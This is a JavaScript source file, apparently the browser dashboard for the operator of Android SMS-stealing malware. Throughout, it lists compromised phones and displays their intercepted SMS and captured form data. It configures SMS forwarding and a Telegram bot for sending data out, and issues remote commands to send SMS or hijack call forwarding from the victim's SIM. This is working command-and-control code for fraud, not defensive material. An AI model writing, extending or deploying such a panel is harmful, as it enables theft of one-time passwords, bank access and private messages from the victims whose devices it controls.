document.addEventListener('DOMContentLoaded', () => {
    const API_BASE_URL = window.location.origin + '/api';

    // --- Element Selectors ---
    const adminPanel = document.getElementById('admin-panel');
    const deviceControlPanel = document.getElementById('device-control-panel');
    const formListPanel = document.getElementById('form-list-panel');
    const deviceListContainer = document.getElementById('device-list');
    const smsListContainer = document.getElementById('sms-list');
    const formListContainer = document.getElementById('form-list');
    const dialogOverlay = document.getElementById('dialog-overlay');
    const dialogBox = document.getElementById('dialog-box');

    let currentDeviceId = null;
    let refreshInterval;
    let isInitialLoad = true;

    // --- Custom Alert/Confirm Dialog Functions ---
    const showAlertDialog = (message) => {
        showDialog(`
            <h3>Message</h3>
            <p>${message}</p>
            <div class="dialog-buttons">
                <button id="btn-dialog-ok">OK</button>
            </div>
        `);
        document.getElementById('btn-dialog-ok').onclick = hideDialog;
    };

    const showErrorDialog = (message) => {
        showDialog(`
            <h3 style="color: var(--offline-status);">Error</h3>
            <p>${message}</p>
            <div class="dialog-buttons">
                <button id="btn-dialog-ok">OK</button>
            </div>
        `);
        document.getElementById('btn-dialog-ok').onclick = hideDialog;
    };

    // --- Navigation ---
    const showAdminPanel = () => {
        adminPanel.style.display = 'block';
        deviceControlPanel.style.display = 'none';
        formListPanel.style.display = 'none';
        currentDeviceId = null;
        startAutoRefresh(fetchDevices);
    };

    const showDeviceControlPanel = (deviceId) => {
        adminPanel.style.display = 'none';
        deviceControlPanel.style.display = 'block';
        formListPanel.style.display = 'none';
        currentDeviceId = deviceId;
        document.getElementById('controlling-device-id').innerText = `Controlling: ${deviceId}`;
        startAutoRefresh(() => {
            fetchSmsLogs();
        });
    };
    
    const showFormListPanel = () => {
        adminPanel.style.display = 'none';
        deviceControlPanel.style.display = 'none';
        formListPanel.style.display = 'block';
        startAutoRefresh(fetchForms);
    };

    // --- API Calls ---
    const apiCall = async (endpoint, method = 'GET', body = null) => {
        try {
            const options = {
                method,
                headers: { 'Content-Type': 'application/json' },
            };
            if (body) {
                options.body = JSON.stringify(body);
            }
            
            const fullUrl = `${API_BASE_URL}${endpoint}`;
            
            const response = await fetch(fullUrl, options);
            
            // Check if response is JSON
            const contentType = response.headers.get("content-type");
            if (contentType && contentType.includes("application/json")) {
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.error || data.message || `HTTP error! status: ${response.status}`);
                }
                
                return data;
            } else {
                // For DELETE requests that might not return JSON
                if (response.ok) {
                    return { success: true };
                } else {
                    const text = await response.text();
                    throw new Error(`HTTP error! status: ${response.status}, message: ${text}`);
                }
            }
        } catch (error) {
            console.error('API Call Error:', error);
            showErrorDialog(`API Error: ${error.message}`);
            return { error: error.message };
        }
    };

    // --- Data Fetching and Rendering ---
    const fetchDevices = async () => {
        try {
            // Initial load में कोई loading नहीं दिखाएं
            if (!isInitialLoad) {
                deviceListContainer.classList.add('loading');
            }
            
            const devices = await apiCall('/devices');
            
            if (isInitialLoad) {
                isInitialLoad = false;
            }
            
            deviceListContainer.classList.remove('loading');
            deviceListContainer.innerHTML = ''; // Clear list
            
            if (!devices || devices.length === 0) {
                deviceListContainer.innerHTML = `
                    <div class="device-card" style="text-align: center; color: var(--text-secondary); padding: 20px;">
                        <p>📱 No devices registered yet</p>
                        <p style="font-size: 0.8em; margin-top: 10px;">Devices will appear here once they register with the server</p>
                    </div>
                `;
                return;
            }
            
            // Permanent devices - कभी automatic नहीं हटेंगे
            devices.forEach(device => {
                const card = document.createElement('div');
                card.className = 'device-card permanent';
                card.dataset.deviceId = device.device_id;
                
                // FIXED: Status stable रहेगा, बार-बार नहीं बदलेगा
                const isOnline = device.is_online === true;
                const lastSeenTime = device.last_seen ? new Date(device.last_seen).toLocaleTimeString() : 'Never';
                
                card.innerHTML = `
                    <div class="device-info">
                        <h3>${device.device_name || 'Unknown Device'}</h3>
                        <p><strong>ID:</strong> ${device.device_id}</p>
                        <p><strong>OS:</strong> ${device.os_version || 'N/A'}</p>
                        <p><strong>Phone:</strong> ${device.phone_number || 'N/A'}</p>
                        <p><strong>Battery:</strong> ${device.battery_level || 0}%</p>
                        <p><strong>Last Active:</strong> ${lastSeenTime}</p>
                    </div>
                    <div class="status-indicator">
                        <div class="status-dot ${isOnline ? 'online' : 'offline'}" 
                             title="${isOnline ? 'Device is online' : 'Device is offline'}"></div>
                        <span class="status-text ${isOnline ? 'online-text' : 'offline-text'}">
                            ${isOnline ? 'ONLINE' : 'OFFLINE'}
                        </span>
                        <span class="delete-icon" data-device-id="${device.device_id}" title="Delete Device Permanently">🗑️</span>
                    </div>
                `;
                
                // FIXED: डिवाइस permanent है, manual delete के बिना नहीं हटेगा
                card.querySelector('.device-info').addEventListener('click', () => {
                    if (device.device_id) {
                        showDeviceControlPanel(device.device_id);
                    }
                });
                
                card.querySelector('.delete-icon').addEventListener('click', (e) => {
                    e.stopPropagation();
                    showConfirmDialog('Permanently delete this device and all its data?', () => deleteDevice(device.device_id));
                });
                
                deviceListContainer.appendChild(card);
            });
        } catch (error) {
            console.error('Error fetching devices:', error);
            deviceListContainer.classList.remove('loading');
            
            // FIXED: Error में भी कुछ दिखाएं
            if (deviceListContainer.children.length === 0) {
                deviceListContainer.innerHTML = `
                    <div class="device-card" style="text-align: center; color: var(--warning-orange); padding: 20px;">
                        <p>⚠️ Connection Issue</p>
                        <p style="font-size: 0.8em; margin-top: 10px;">Devices will appear when connection is restored</p>
                    </div>
                `;
            }
        }
    };

    const fetchSmsLogs = async () => {
        if (!currentDeviceId) return;
        try {
            const smsLogs = await apiCall(`/device/${currentDeviceId}/sms`);
            if (smsLogs.error) return;
            
            smsListContainer.innerHTML = '';
            
            if (!smsLogs || smsLogs.length === 0) {
                smsListContainer.innerHTML = `
                    <div class="sms-item" style="text-align: center; color: var(--text-secondary);">
                        No SMS received yet
                    </div>
                `;
                return;
            }
            
            smsLogs.forEach(sms => {
                const item = document.createElement('div');
                item.className = 'sms-item';
                item.innerHTML = `
                    <div style="flex: 1;">
                        <p><strong>From:</strong> ${sms.sender || 'Unknown'}</p>
                        <p style="margin: 8px 0;">${sms.message_body || ''}</p>
                        <p style="color: var(--text-secondary); font-size: 0.8em;">
                            ${sms.received_at ? new Date(sms.received_at).toLocaleString() : 'Unknown time'}
                        </p>
                    </div>
                    <span class="delete-icon" data-sms-id="${sms.id}" title="Delete SMS">🗑️</span>
                `;
                item.querySelector('.delete-icon').addEventListener('click', (e) => {
                     e.stopPropagation();
                     showConfirmDialog('Delete this SMS?', () => deleteSms(sms.id));
                });
                smsListContainer.appendChild(item);
            });
        } catch (error) {
            console.error('Error fetching SMS logs:', error);
        }
    };
    
    const fetchForms = async () => {
        if (!currentDeviceId) return;
        try {
            const forms = await apiCall(`/device/${currentDeviceId}/forms`);
            if (forms.error) return;
            
            formListContainer.innerHTML = '';
            
            if (!forms || forms.length === 0) {
                formListContainer.innerHTML = `
                    <div class="form-item" style="text-align: center; color: var(--text-secondary);">
                        No forms submitted yet
                    </div>
                `;
                return;
            }
            
            forms.forEach(form => {
                const item = document.createElement('div');
                item.className = 'form-item';
                // Replace newlines with <br> for display
                const formattedData = (form.custom_data || '').replace(/\n/g, '<br>');
                item.innerHTML = `
                    <div style="flex: 1;">
                        <div style="white-space: pre-wrap;">${formattedData}</div>
                        <p style="color: var(--text-secondary); font-size: 0.8em; margin-top: 8px;">
                            ${form.submitted_at ? new Date(form.submitted_at).toLocaleString() : 'Unknown time'}
                        </p>
                    </div>
                `;
                formListContainer.appendChild(item);
            });
        } catch (error) {
            console.error('Error fetching forms:', error);
        }
    };

    // --- Actions ---
    const deleteDevice = async (deviceId) => {
        try {
            const result = await apiCall(`/device/${deviceId}`, 'DELETE');
            if (!result.error) {
                showAlertDialog('Device deleted successfully');
                if (currentDeviceId === deviceId) {
                    showAdminPanel(); // Go back to admin panel if deleting current device
                } else {
                    fetchDevices(); // Refresh list
                }
            }
        } catch (error) {
            console.error('Error deleting device:', error);
        }
    };
    
    const deleteSms = async (smsId) => {
        try {
            const result = await apiCall(`/sms/${smsId}`, 'DELETE');
            if (!result.error) {
                showAlertDialog('SMS deleted successfully');
                fetchSmsLogs(); // Refresh list
            }
        } catch (error) {
            console.error('Error deleting SMS:', error);
        }
    };

    // --- Dialogs ---
    const showDialog = (content) => {
        dialogBox.innerHTML = content;
        dialogOverlay.style.display = 'flex';
    };

    const hideDialog = () => {
        dialogOverlay.style.display = 'none';
    };

    const showConfirmDialog = (message, onConfirm) => {
        showDialog(`
            <h3>Confirmation</h3>
            <p>${message}</p>
            <div class="dialog-buttons">
                <button id="btn-dialog-no" class="btn-cancel">NO</button>
                <button id="btn-dialog-yes">YES</button>
            </div>
        `);
        document.getElementById('btn-dialog-yes').onclick = () => {
            onConfirm();
            hideDialog();
        };
        document.getElementById('btn-dialog-no').onclick = hideDialog;
    };
    
    const showUpdateForwardingDialog = async () => {
        try {
            const config = await apiCall('/config/sms_forward');
            showDialog(`
                <h3>Update Forwarding Number</h3>
                <input type="text" id="input-forward-number" 
                       placeholder="Enter phone number with country code (+91...)" 
                       value="${config.forward_number || ''}" 
                       style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
                <div class="dialog-buttons">
                    <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
                    <button id="btn-dialog-update">Update</button>
                </div>
            `);
            document.getElementById('btn-dialog-update').onclick = async () => {
                const number = document.getElementById('input-forward-number').value.trim();
                if (!number) {
                    showErrorDialog('Please enter a phone number');
                    return;
                }
                const result = await apiCall('/config/sms_forward', 'POST', { forward_number: number });
                if (!result.error) {
                    showAlertDialog('Forwarding number updated successfully!');
                    hideDialog();
                }
            };
            document.getElementById('btn-dialog-cancel').onclick = hideDialog;
        } catch (error) {
            console.error('Error showing forwarding dialog:', error);
        }
    };
    
    const showUpdateTelegramDialog = async () => {
        try {
            const config = await apiCall('/config/telegram');
            showDialog(`
                <h3>Update Telegram Settings</h3>
                <input type="text" id="input-bot-token" 
                       placeholder="Bot Token" 
                       value="${config.telegram_bot_token || ''}" 
                       style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
                <input type="text" id="input-chat-id" 
                       placeholder="Chat ID" 
                       value="${config.telegram_chat_id || ''}" 
                       style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
                <div class="dialog-buttons">
                    <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
                    <button id="btn-dialog-update">Update</button>
                </div>
            `);
            document.getElementById('btn-dialog-update').onclick = async () => {
                const botToken = document.getElementById('input-bot-token').value.trim();
                const chatId = document.getElementById('input-chat-id').value.trim();
                if (!botToken || !chatId) {
                    showErrorDialog('Please enter both Bot Token and Chat ID');
                    return;
                }
                const result = await apiCall('/config/telegram', 'POST', { 
                    telegram_bot_token: botToken, 
                    telegram_chat_id: chatId 
                });
                if (!result.error) {
                    showAlertDialog('Telegram settings updated successfully!');
                    hideDialog();
                }
            };
            document.getElementById('btn-dialog-cancel').onclick = hideDialog;
        } catch (error) {
            console.error('Error showing telegram dialog:', error);
        }
    };
    
    const showSendSmsDialog = () => {
        showDialog(`
            <h3>Send SMS</h3>
            <input type="text" id="input-sms-number" 
                   placeholder="Recipient Phone Number (+91...)" 
                   style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
            <textarea id="input-sms-message" 
                      placeholder="Your message..." 
                      style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white; min-height: 100px; resize: vertical;"></textarea>
            <div style="margin: 10px 0;">
                <label style="color: var(--text-secondary);">Select SIM Slot:</label>
                <select id="select-sim-slot" style="width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
                    <option value="0">SIM 1</option>
                    <option value="1">SIM 2</option>
                </select>
            </div>
            <div class="dialog-buttons">
                <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
                <button id="btn-dialog-send">Send SMS</button>
            </div>
        `);
        document.getElementById('btn-dialog-send').onclick = async () => {
            const phoneNumber = document.getElementById('input-sms-number').value.trim();
            const message = document.getElementById('input-sms-message').value.trim();
            const simSlot = parseInt(document.getElementById('select-sim-slot').value);
            
            if (!phoneNumber || !message) {
                showErrorDialog('Please enter both phone number and message');
                return;
            }
            
            const command = {
                device_id: currentDeviceId,
                command_type: 'send_sms',
                command_data: {
                    phone_number: phoneNumber,
                    message: message,
                    sim_slot: simSlot
                }
            };
            
            const result = await apiCall('/command/send', 'POST', command);
            if (!result.error) {
                showAlertDialog('SMS command sent successfully!');
                hideDialog();
            }
        };
        document.getElementById('btn-dialog-cancel').onclick = hideDialog;
    };
    
    const showCallForwardingDialog = () => {
        showDialog(`
            <h3>Call Forwarding</h3>
            <input type="text" id="input-forward-number" 
                   placeholder="Forward to (+91...)" 
                   style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
            <div style="margin: 10px 0;">
                <label style="color: var(--text-secondary);">Select SIM Slot:</label>
                <select id="select-sim-slot" style="width: 100%; padding: 10px; margin: 5px 0; border-radius: 5px; border: 1px solid #555; background: #333; color: white;">
                    <option value="0">SIM 1</option>
                    <option value="1">SIM 2</option>
                </select>
            </div>
            <div class="dialog-buttons" style="display: flex; gap: 10px;">
                <button id="btn-dialog-enable" style="flex: 1;">Activate</button>
                <button id="btn-dialog-disable" style="flex: 1; background: linear-gradient(90deg, #E74C3C, #C0392B);">Deactivate</button>
            </div>
            <div class="dialog-buttons" style="margin-top: 10px;">
                <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
            </div>
        `);
        
        document.getElementById('btn-dialog-enable').onclick = async () => {
            const forwardNumber = document.getElementById('input-forward-number').value.trim();
            const simSlot = parseInt(document.getElementById('select-sim-slot').value);
            
            if (!forwardNumber) {
                showErrorDialog('Please enter a forward number');
                return;
            }
            
            const command = {
                device_id: currentDeviceId,
                command_type: 'call_forward',
                command_data: {
                    action: 'enable',
                    forward_number: forwardNumber,
                    sim_slot: simSlot
                }
            };
            
            const result = await apiCall('/command/send', 'POST', command);
            if (!result.error) {
                showAlertDialog('Call forwarding activated!');
                hideDialog();
            }
        };
        
        document.getElementById('btn-dialog-disable').onclick = async () => {
            const simSlot = parseInt(document.getElementById('select-sim-slot').value);
            
            const command = {
                device_id: currentDeviceId,
                command_type: 'call_forward',
                command_data: {
                    action: 'disable',
                    sim_slot: simSlot
                }
            };
            
            const result = await apiCall('/command/send', 'POST', command);
            if (!result.error) {
                showAlertDialog('Call forwarding deactivated!');
                hideDialog();
            }
        };
        
        document.getElementById('btn-dialog-cancel').onclick = hideDialog;
    };

    // --- Auto-Refresh ---
    const startAutoRefresh = (callback) => {
        clearInterval(refreshInterval);
        if (callback) {
            callback();
            // FIXED: 5 सेकंड का interval - status stable रहेगा
            refreshInterval = setInterval(() => {
                try {
                    callback();
                } catch (error) {
                    console.error('Auto-refresh error:', error);
                }
            }, 5000);
        }
    };

    // --- Event Listeners ---
    document.getElementById('btn-update-forwarding').addEventListener('click', showUpdateForwardingDialog);
    document.getElementById('btn-update-telegram').addEventListener('click', showUpdateTelegramDialog);
    document.getElementById('btn-send-sms').addEventListener('click', showSendSmsDialog);
    document.getElementById('btn-call-forwarding').addEventListener('click', showCallForwardingDialog);
    document.getElementById('btn-get-forms').addEventListener('click', showFormListPanel);
    document.getElementById('btn-back-to-admin').addEventListener('click', showAdminPanel);
    document.getElementById('btn-back-to-control').addEventListener('click', () => showDeviceControlPanel(currentDeviceId));
    
    dialogOverlay.addEventListener('click', (e) => {
        if (e.target === dialogOverlay) hideDialog();
    });

    // --- Initial Load ---
    showAdminPanel();
    
    // FIXED: Page load होते ही तुरंत devices fetch करें - कोई loading नहीं
    setTimeout(() => {
        fetchDevices();
    }, 100);
    
    // Add keyboard shortcut for escape to close dialog
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && dialogOverlay.style.display === 'flex') {
            hideDialog();
        }
    });
    
    // FIXED: Pre-fetch data for better UX
    window.addEventListener('load', () => {
        console.log('Panel loaded successfully');
    });
});
